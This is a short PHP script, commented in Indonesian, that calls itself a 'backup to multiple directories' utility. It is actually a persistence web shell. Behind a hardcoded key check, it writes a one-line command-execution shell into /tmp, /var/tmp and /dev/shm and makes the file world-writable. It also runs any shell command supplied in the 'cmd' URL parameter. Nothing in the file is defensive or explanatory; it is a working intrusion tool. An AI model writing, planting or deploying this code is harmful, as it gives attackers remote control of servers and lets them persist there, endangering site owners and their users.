<?php
// ================================================================
// PERSISTENT PLUS – Backup ke Multiple Directories (FIXED)
// ================================================================

// Auth
if (!isset($_GET['key']) || $_GET['key'] !== 'your_secret_key') {
    die('Access denied');
}

// Daftar direktori backup
$backup_dirs = ['/tmp/', '/var/tmp/', '/dev/shm/'];
$code = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>';

foreach ($backup_dirs as $dir) {
    if (is_writable($dir)) {
        $file = $dir . 'shell_backup.php';
        if (!file_exists($file)) {
            file_put_contents($file, $code);
            if (PHP_OS !== 'WINNT') { 
                chmod($file, 0777); 
            }
        }
    }
}

// Eksekusi perintah
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>